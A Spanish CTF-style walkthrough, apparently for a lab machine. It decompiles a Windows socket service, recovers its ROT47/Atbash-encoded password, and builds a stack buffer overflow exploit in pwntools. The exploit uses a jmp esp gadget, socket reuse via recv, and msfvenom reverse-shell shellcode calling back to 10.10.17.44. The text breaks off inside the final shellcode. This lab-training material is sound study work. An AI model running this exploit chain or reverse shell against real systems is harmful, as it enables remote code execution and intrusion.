alfiansyah:\n$ nc 10.10.11.115 9999 Welcome Brankas Application. Username: alfiansyah Password: ayXx;ll?|x;lZk9K% Username or Password incorrect  Pero no es correcta. Entonces, lo que podemos hacer es descompilar el binario con Ghidra y leer el código fuente en C generado. La función main básicamente arranca un servidor de sockets y espera nuevas conexiones. Cuando se recibe uan conexión, se crea un hilo (thread) que gestiona dicha conexión:\nint __cdecl _main(int _Argc, char **_Argv, char **_Env) { // Declarations and initializations local_1c = getaddrinfo(0, \"9999\", \u0026amp;local_1dc, \u0026amp;local_1e0); if (local_1c == 0) { local_20 = socket(*(int *) (local_1e0 + 4), *(int *) (local_1e0 + 8), *(int *) (local_1e0 + 12)); if (local_20 == 0xffffffff) { // Error handling } else { tVar3 = _time((time_t *) 0); _srand((uint) tVar3); local_24 = _rand(); local_28 = *(int *) (local_1e0 + 0x18); local_2c = local_24 % 1000 + 9000; uVar1 = htons((u_short) local_2c); *(u_short *) (local_28 + 2) = uVar1; _printf(\"Server Started on Port %d\\r\\n\", local_2c); local_1c = setsockopt(local_20, 0xffff, 4, (char *) \u0026amp;local_1f8, local_18); if (local_1c == -1) { // Error handling } local_1c = bind(local_20, *(sockaddr **) (local_1e0 + 0x18), *(int *) (local_1e0 + 0x10)); if (local_1c == -1) { // Error handling } else { _puts(\"Waiting Connection\\r\"); local_1c = listen(local_20, 0x7fffffff); if (local_1c == -1) { // Error handling } else { while (local_20 != 0) { local_14 = (LPVOID) accept(local_20, \u0026amp;local_1f0, \u0026amp;local_1f4); if (local_14 == (LPVOID) 0xffffffff) { // Error handling } _puts(\"Connection Received\\r\"); CreateThread((LPSECURITY_ATTRIBUTES) 0, 0, (LPTHREAD_START_ROUTINE) \u0026amp;_cHandler@4, local_14, 0, (LPDWORD) 0); } closesocket(0); WSACleanup(); iVar2 = 0; } } } } else { // Error handling } return iVar2; }  El gestor de la conexión es la siguiente función, que muestra los mensajes y espera a la entrada del usuario. Aquí podemos algunos ver los valores esperados para utilizar el servicio (es decir, Vickry Alfiansyah como nombre completo y T3D83CbJkl1299 como código):\nint UndefinedFunction_71901a3d(SOCKET param_1) { int iVar1; char acStack67[17]; char acStack50[10]; int iStack40; char *pcStack36; char *pcStack32; int iStack28; int iStack24; SOCKET SStack20; char *pcStack16; _puts(\"thread cretead\\r\"); pcStack16 = (char *) _malloc(0x400); SStack20 = param_1; _memset(pcStack16, 0, 0x400); iStack24 = send(SStack20, \"Welcome Brankas Application.\\n\", 0x1d, 0); if (iStack24 == -1) { // Error handling } else if (SStack20 != 0) { iStack28 = 0; send(SStack20, \"Username: \", 10, 0); recv(SStack20, pcStack16, 0x400, 0); _strncpy(acStack50, pcStack16, 10); _memset(pcStack16, 0, 0x400); send(SStack20, \"Password: \", 10, 0); recv(SStack20, pcStack16, 0x400, 0); _strncpy(acStack67, pcStack16, 0x11); _memset(pcStack16, 0, 0x400); iStack28 = _login(acStack50, acStack67); if (iStack28 == 0) { send(SStack20, \"Username or Password incorrect\\r\\n\", 0x21, 0); closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } send(SStack20, \"Login Successfully!\\r\\n\", 0x15, 0); pcStack32 = (char *) _malloc(0x50); pcStack36 = (char *) _malloc(100); while (true) { send(SStack20, \"FullName: \", 10, 0); iStack40 = recv(SStack20, pcStack16, 0x400, 0); if (iStack40 == 0) { closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } if (iStack40 \u0026lt; 1) break; _memset(pcStack36, 0, 100); _strncpy(pcStack36, pcStack16, 100); _memset(pcStack16, 0, 0x400); send(SStack20, \"Input Your Code: \", 0x11, 0); recv(SStack20, pcStack16, 0x400, 0); _memset(pcStack32, 0, 0x50); _strncpy(pcStack32, pcStack16, 0x50); _SaveCreds(pcStack32, pcStack36); iVar1 = _strncmp(pcStack32, \"T3D83CbJkl1299\", 0xe); if (iVar1 != 0) { send(SStack20, \"Wrong Code\\r\\n\", 0xd, 0); closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } iVar1 = _strncmp(pcStack36, \"Vickry Alfiansyah\", 0x11); if (iVar1 == 0) { send(SStack20, \"Unlocked\\r\\n\", 0xb, 0); closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } } iVar1 = WSAGetLastError(); _printf(\"Recv failed with error: %d\\n\", iVar1); closesocket(SStack20); iStack24 = 1; } return iStack24; }  Existe una función llamada _login que se encarga de la autenticación del usuario:\nint _login(char *param_1, void *param_2) { size_t sVar1; int iVar2; undefined local_39[17]; char *local_28; char *local_24; char *local_20; size_t local_1c; char *local_18; char *local_14; char *local_10; local_10 = \"alfiansyah\"; local_14 = \"YXlYeDtsbD98eDtsWms5SyU=\"; _memmove(local_39, param_2, 0x11); local_18 = (char *) _encrypt1(0, local_39); local_1c = _strlen(local_18); local_24 = (char *) _encrypt2(local_18, local_1c); local_20 = local_24; sVar1 = _strlen(local_24); local_28 = (char *) _b64_encode(local_24, sVar1); iVar2 = _strcmp(local_10, param_1); if ((iVar2 == 0) \u0026amp;\u0026amp; (iVar2 = _strcmp(local_14, local_28), iVar2 == 0)) { return 1; } return 0; }  Ahora podemos ver que la contraseña está cifrada con dos funciones encrypt1 y encrypt2 y después se codifica en Base64.\nLas funciones de cifrado utilizan un algoritmo de sustitución:\nchar * _encrypt1(int param_1, char *param_2) { char cVar1; char *_Str; size_t sVar2; uint local_10; _Str = _strdup(param_2); sVar2 = _strlen(_Str); for (local_10 = 0; local_10 \u0026lt; sVar2; local_10 = local_10 + 1) { if ((' ' \u0026lt; _Str[local_10]) \u0026amp;\u0026amp; (_Str[local_10] != '\\x7f')) { cVar1 = (char)(_Str[local_10] + 0x2f); if (_Str[local_10] + 0x2f \u0026lt; 0x7f) { _Str[local_10] = cVar1; } else { _Str[local_10] = cVar1 + -0x5e; } } } return _Str; }  char * _encrypt2(char *param_1, int param_2) { bool bVar1; char *pcVar2; byte local_11; int local_10; pcVar2 = _strdup(param_1); for (local_10 = 0; local_10 \u0026lt; param_2; local_10 = local_10 + 1) { local_11 = param_1[local_10]; if ((local_11 \u0026lt; 0x41) || (((0x5a \u0026lt; local_11 \u0026amp;\u0026amp; (local_11 \u0026lt; 0x61)) || (0x7a \u0026lt; local_11)))) { pcVar2[local_10] = local_11; } else { bVar1 = local_11 \u0026lt; 0x5b; if (bVar1) { local_11 = local_11 + 0x20; } pcVar2[local_10] = 'z' - (local_11 + 0x9f); if (bVar1) { pcVar2[local_10] = pcVar2[local_10] + -0x20; } } } return pcVar2; }  Como la descompilación de Ghidra es un poco rara, decidí escribir estas funciones como se muestra a continuación (encrypt1 y encrypt2, respectivamente):\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char** argv) { int i; int length; char c; char* s; s = argv[1]; length = strlen(s); for (i = 0; i \u0026lt; length; i++) { if (0x20 \u0026lt; s[i] \u0026amp;\u0026amp; s[i] != 0x7f) { c = (char) (s[i] + 0x2f); if (s[i] + 0x2f \u0026lt; 0x7f) { s[i] = c; } else { s[i] = c - 0x5e; } } } puts(s); return 0; }  #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char** argv) { _Bool b; int i; int length; char c; char* s; s = argv[1]; length = strlen(s); for (i = 0; i \u0026lt; length; i++) { c = s[i]; if ((0x41 \u0026lt;= c \u0026amp;\u0026amp; c \u0026lt;= 0x5a) || (0x61 \u0026lt;= c \u0026amp;\u0026amp; c \u0026lt;= 0x7a)) { b = (c \u0026lt;= 0x5a); if (b) { c += ' '; } s[i] = 0x7a - (c + 0x9f); if (b) { s[i] -= 0x20; } } } puts(s); return 0; }  Ahora podemos compilarlas y analizar su comportamiento al cifrar todos los caracteres ASCII imprimibles (excepto espacios, saltos de línea y retornos de carro):\n$ gcc -o encrypt1 encrypt1.c $ gcc -o encrypt2 encrypt2.c $ chars=\"$(python3 -c 'import string; print(string.printable.strip())')\" $ echo $chars; ./encrypt1 \"$chars\" 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%\u0026'()*+,-./:;?@[\\]^_`{|}~ _`abcdefgh23456789:;?@ABCDEFGHIJKpqrstuvwxyz{|}~!\"#$%\u0026'()*+PQRSTUVWXYZ[\\]^ijklmno,-./01LMNO $ echo $chars; ./encrypt2 \"$chars\" 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%\u0026'()*+,-./:;?@[\\]^_`{|}~ 0123456789zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA!\"#$%\u0026'()*+,-./:;?@[\\]^_`{|}~  La primera función realiza una sustitución un tanto rara, mientras que la segunda solamente invierte el orden de las letras mayúsculas y minúsculas.\nAunque se puede invertir el algoritmo o crear un mapa que relacione las letras de entrada con las letras de salida para descifrar la contraseña, decidí utilizar un script en Bash para iterar sobre todos los caracteres imprimibles hasta encontrar las coincidencias:\n#!/usr/bin/env bash encrypted='YXlYeDtsbD98eDtsWms5SyU=' echo \"Encrypted : $encrypted\" encrypted2=$(echo $encrypted | base64 -d) echo \"Encrypted2: $encrypted2\" for i in $(seq 1 ${#encrypted2}); do for d in {32..126}; do c=$(python3 -c \"print(chr($d))\") if [ \"$(./encrypt2 $c)\" = ${encrypted2:i-1:1} ]; then encrypted1+=$c break fi done done echo \"Encrypted1: $encrypted1\" for i in $(seq 1 ${#encrypted1}); do for d in {32..126}; do c=$(python3 -c \"print(chr($d))\") if [ \"$(./encrypt1 $c)\" = ${encrypted1:i-1:1} ]; then decrypted+=$c break fi done done echo \"Decrypted : $decrypted\" echo Re-compute: $(./encrypt2 \"$(./encrypt1 \"$decrypted\")\" | tr -d '\\n' | base64)  El procedimiento es el inverso. Primero decodificamos en Base64, luego desciframos con el segundo tipo de cifrado y después desciframos con el primer tipo de cifrado. Una vez hecho, volvemos a usar encrypt1, encrypt2 y base64 para verificar que tenemos la contraseña correcta:\n$ bash decrypt.sh Encrypted : YXlYeDtsbD98eDtsWms5SyU= Encrypted2: ayXx;ll?|x;lZk9K% Encrypted1: zbCc;oo?|c;oAp9P% Decrypted : K3r4j@@nM4j@pAh!T Re-compute: YXlYeDtsbD98eDtsWms5SyU=  Los tres scripts se pueden encontrar aquí: decrypt.sh, encrypt1.c, encrypt2.c.\nDe hecho, descubrí que los dos tipos de cifrado son algoritmos conocidos: encrypt1 es ROT47 y encrypt2 es el cifrado Atbash. Podemos utilizar CyberChef para descifrar la contraseña de manera más sencilla:\nPerfecto, ahora nos podemos autenticar correctamente:\n$ nc 10.10.11.115 9999 Welcome Brankas Application. Username: alfiansyah Password: K3r4j@@nM4j@pAh!T Login Successfully! FullName: Vickry Alfiansyah Input Your Code: T3D83CbJkl1299 Unlocked Ncat: Broken pipe.  Pero no conseguimos nada\u0026hellip; A lo mejor tenemos que explotar el binario\u0026hellip;\nEscalada de privilegios (explotación de Buffer Overflow) Mirando de nuevo al código en C descompilado, encontramos una vulnerabilidad de Buffer Overflow en una función llamada _SaveCreds:\nvoid _SaveCreds(char *param_1, char *param_2) { char local_42[50]; char *local_10; local_10 = (char *) _malloc(100); _strcpy(local_10, param_2); _strcpy(local_42, param_1); }  Esto es vulnerable porque local_42 tiene 50 bytes asignados como buffer, el programa utiliza strcpy (que se sabe que es vulnerable a Buffer Overflow) y param_1 viene de la función que gestiona la conexión (pcStack32), y puede contener como máximo 0x50 = 80 bytes:\nint UndefinedFunction_71901a3d(SOCKET param_1) { // ... if (iStack24 == -1) { // Error handling } else if (SStack20 != 0) { // ... if (iStack28 == 0) { // ... _memset(pcStack36, 0, 100); _strncpy(pcStack36, pcStack16, 100); _memset(pcStack16, 0, 0x400); send(SStack20, \"Input Your Code: \", 0x11, 0); recv(SStack20, pcStack16, 0x400, 0); _memset(pcStack32, 0, 0x50); _strncpy(pcStack32, pcStack16, 0x50); _SaveCreds(pcStack32, pcStack36); iVar1 = _strncmp(pcStack32, \"T3D83CbJkl1299\", 0xe); // ... } // ... } return iStack24; }  Las vulnerabilidades de Buffer Overflow pueden desembocar en ejecución de código arbitrario porque podemos sobrescribir la dirección de retorno guardada en la pila (después del buffer reservado) y redirigir el flujo de ejecución.\nEn primer lugar, necesitamos saber el número de caracteres que tenemos que escribir para sobrescribir la dirección de retorno (que será almacenada en el registro $eip al retornar de la función _SaveCreds). Esto puede hacerse con un patrón (cyclic de pwntools o algunos comandos de MetaSploit Framework servirán).\nPara desarrollar el exploit final, utilizaremos varios archivos, de manera que cada archivo contenga un paso más en el proceso de explotación. Aquí tenemos exploitA.py:\n#!/usr/bin/env python3 from pwn import * context.log_level = 'DEBUG' def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' payload = code payload += cyclic(200) r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Para poder desarrollar el exploit, necesitamos una máquina Windows con un depurador. Esta vez, estaré utilizando x64dbg (realmente, una versión llamada x32dbg porque el binario es de 32 bits).\nOtro tema a tener en cuenta es que el servidor de sockets escucha en un puerto aleatorio entre el 9000 y el 9999 (se muestra en el registro de salida del servidor). Por este motivo, añadí la dirección IP y el puerto como argumentos de línea de comandos al script de Python. Una vez que el programa está listo para aceptar conexiones, ejecutamos el exploit:\n$ python3 exploitA.py 192.168.1.47 9291 [+] Opening connection to 192.168.1.47 on port 9291: Done [DEBUG] Received 0x1d bytes: b'Welcome Brankas Application.\\n' [DEBUG] Received 0xa bytes: b'Username: ' [DEBUG] Sent 0xb bytes: b'alfiansyah\\n' [DEBUG] Received 0xa bytes: b'Password: ' [DEBUG] Sent 0x12 bytes: b'K3r4j@@nM4j@pAh!T\\n' [DEBUG] Received 0x15 bytes: b'Login Successfully!\\r\\n' [DEBUG] Received 0xa bytes: b'FullName: ' [DEBUG] Sent 0x12 bytes: b'Vickry Alfiansyah\\n' [DEBUG] Received 0x11 bytes: b'Input Your Code: ' [DEBUG] Sent 0x203 bytes: b'T3D83CbJkl1299aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaa\\n' [*] Closed connection to 192.168.1.47 port 9291  El depurador se para y muestra que $eip tiene valor 0x6161616e:\nEl valor 0x6161616e es naaa en formato bytes (formato little-endian). Podemos calcular el offset necesario de esta manera:\n$ pwn cyclic -l naaa 52  Ahora, vamos a verificar que controlamos $eip poniendo BBBB (0x42424242). Aprovechamos también para añadir otro patrón después de $eip para medir el espacio disponible en la pila (stack) para escribir. Este es exploitB.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 payload = code payload += b'A' * offset payload += b'BBBB' payload += cyclic(200) r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  En la captura de arriba, vemos que $eip tiene valor 0x42424242, como esperábamos. Y también se observa que solamente tenemos 10 bytes de espacio disponible después de sobrescribir la dirección de retorno.\nEsto es un problema porque los shellcodes de Windows ocupan más de 300 bytes. Solamente tenemos 52 bytes en la parte de basura (letras A) y 10 bytes adicionales para añadir algunas instrucciones.\nPrimero de todo, tenemos que encontrar la dirección a una instrucción jmp esp en el binario. Esto lo podemos hacer con ROPgadget:\n$ ROPgadget --binary MyFirstApp.exe | grep ': jmp esp' 0x7190239f : jmp esp  En este punto, podemos sobrescribir la dirección de retorno con 0x7190239f, que es una dirección del binario que ejecuta jmp esp. Pondremos 8 instrucciones de breakpoint (\\xcc) después de este valor para que el depurador se pare al tratar de ejecutarlas. Este es exploitC.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) payload = code payload += b'A' * offset payload += jmp_esp payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Aquí vemos que el programa se ha parado en la primera instrucción de breakpoint, por lo que vamos bien. El siguiente paso será saltar hacia atrás en la pila donde tenemos las letras A. La idea es añadir instrucciones ahí para ejecutar código arbitrario. La longitud del salto es 56 (52 del offset y 4 de la dirección sobrescrita). Este es exploitD.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += b'\\xcc' * offset payload += jmp_esp payload += jmp_back payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Genial, ahora estamos parados en el primer breakpoint del área de relleno. Este gráfico puede ayudar a entender la estrategia de explotación:\nTenemos 52 bytes para escribir shellcode personalizado (el área de color rojo). Como dijimos antes, no hay ningún shellcode común que entre en 52 bytes, por lo que utilizaremos una técnica llamada Socket Reuse (puedes leer este write-up de vulnserver.exe para más información).\nVamos a llamar a recv para leer datos adicionales desde la conexión del socket y escribirlos en la pila (stack), de forma que ya no tengamos la limitación del buffer. Para este propósito, 52 bytes son más que suficientes.\nPara llamar a recv necesitamos configurar los argumentos correctamente (más información aquí):\nint recv(SOCKET s, char* buf, int len, int flags);   s es el descriptor de archivo de la conexión del socket (cambia cada vez que el programa se reinicia). buf es la dirección del espacio de memoria donde escribir los datos recibidos. len es la longitud máxima que se espera leer. flags añaden alguna configuración (normalmente estará a 0).  La primera tarea que tenemos que realizar es averiguar dónde se guarda el descriptor de archivo del socket. Para eso, vamos a poner un breakpoint en una llamada a recv para ver sus argumentos:\nAhora podemos ejecutar el exploit y ver que el programa se para en recv:\nEl descriptor de archivo del socket es 0x13c, y está en la dirección 0x0101ff18.\nAdemás, vemos que 0x13c se toma de $ebp - 0x10 y se guarda en $eax, y luego el valor de $eax se sube a la pila. Por tanto, 0x13c también se puede encontrar en 0x0101ff60 ($ebp - 0x10).\nPodemos guardar el valor del descriptor de archivo del socket en $eax mediante las siguientes instrucciones en ensamblador:\nadd esp, 0x48 # 83 c4 48 pop eax # 58 push eax # 50 sub esp, 0x48 # 83 ec 48  Nótese que añadimos 0x48 al puntero de pila porque 0x0101ff60 - 0x0101ff18 = 0x48, y además volvemos a subir a la pila para dejarla como estaba. Vamos a ver si funciona con exploitE.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += b'\\xcc' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Perfecto, todo va bien.\nSin embargo, tendremos un problema que solventar. Si continuamos escribiendo instrucciones, acabaremos por sobrescribirnos a nosotros mismos porque utilizamos la pila. Por tanto, necesitamos disminuir el valor del puntero de pila, por ejemplo 0x64:\nsub esp, 0x64 # 83 ec 64  Ahora preparamos la llamada a recv. Para ello, tenemos que añadir los argumentos a la pila en sentido inverso (es decir, flags, len, buf, s y luego usar la instrucción call) debido a la convención de llamadas a funciones en x86.\nEl parámetro flags tendrá un valor de 0. Como los bytes nulos son bad characters (ya que la función vulnerable es strcpy y los bytes nulos terminan las cadenas de caracteres en C), tendremos que subir un 0 utilizando una instrucción xor:\nxor ebx, ebx # 31 db push ebx # 53  El siguiente parámetro es len, que tendrá un valor de 0x400 (esto es 1024 bytes de espacio para escribir). De nuevo, para evitar los bytes nulos, podemos escribir un simple 0x4 en $bh y subir $ebx a la pila:\nadd bh, 0x4 # 80 c7 04 push ebx # 53  El próximo paso es guardar la dirección donde queremos que los datos sean escritos. Usaremos un cierto offset desde el puntero de la pila para ello:\nmov ebx, esp # 89 e3 add ebx, 0x64 # 83 c3 64 push ebx # 53  Finalmente, añadimos el descriptor de archivo del socket, que estaba guardado en $eax:\npush eax # 50  Vamos a escribir exploitF.py para ver si todos los argumentos están correctamente configurados antes de llamar a recv:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += asm('sub esp, 0x64') payload += asm('xor ebx, ebx') payload += asm('push ebx') payload += asm('add bh, 0x04') payload += asm('push ebx') payload += asm('mov ebx, esp') payload += asm('add ebx, 0x64') payload += asm('push ebx') payload += asm('push eax') payload += b'\\xcc' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Ahora podemos llamar a recv, cuya dirección en el binario es 0x719082ac (aparece en la captura de pantalla con el breakpoint). Entonces podemos utilizar unas instrucciones como estas:\nmov eax, ds:0x719082ac # a1 ac 82 90 71 call eax # ff d0  Añadí instrucciones de breakpoint para ver si el socket recibía y ejecutaba el segundo payload. También cambié las instrucciones de breakpoint del primer payload y puse instruciones nop (\\x90).\nEste es exploitG.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += asm('sub esp, 0x64') payload += asm('xor ebx, ebx') payload += asm('push ebx') payload += asm('add bh, 0x04') payload += asm('push ebx') payload += asm('mov ebx, esp') payload += asm('add ebx, 0x64') payload += asm('push ebx') payload += asm('push eax') payload += asm('mov eax, dword ptr ds:0x719082ac') payload += asm('call eax') payload += b'\\x90' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\x90' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) shellcode = b'\\xcc' * 400 sleep(1) r.sendline(shellcode) if __name__ == '__main__': main()  Ok, se ejecuta el segundo payload. Ahora podemos crear shellcode con msfvenom para conseguir una reverse shell en la máquina víctima:\n$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f c [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of c file: 1386 bytes unsigned char buf[] = \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\" \"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\" \"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\" \"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\" \"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\" \"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\" \"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\" \"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\" \"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\" \"\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\" \"\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\" \"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\" \"\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x0a\\x11\\x2c\\x68\" \"\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\" \"\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\" \"\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\" \"\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\" \"\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\" \"\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\" \"\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\" \"\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\" \"\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\";  Y este es el exploit final (exploitH.py):\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += asm('sub esp, 0x64') payload += asm('xor ebx, ebx') payload += asm('push ebx') payload += asm('add bh, 0x04') payload += asm('push ebx') payload += asm('mov ebx, esp') payload += asm('add ebx, 0x64') payload += asm('push ebx') payload += asm('push eax') payload += asm('mov eax, ds:0x719082ac') payload += asm('call eax') payload += b'\\x90' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\x90' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) shellcode = ( b'\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30' b'\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff' b'\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52' b'\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1' b'\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b' b'\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03' b'\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b' b'\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24' b'\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb' 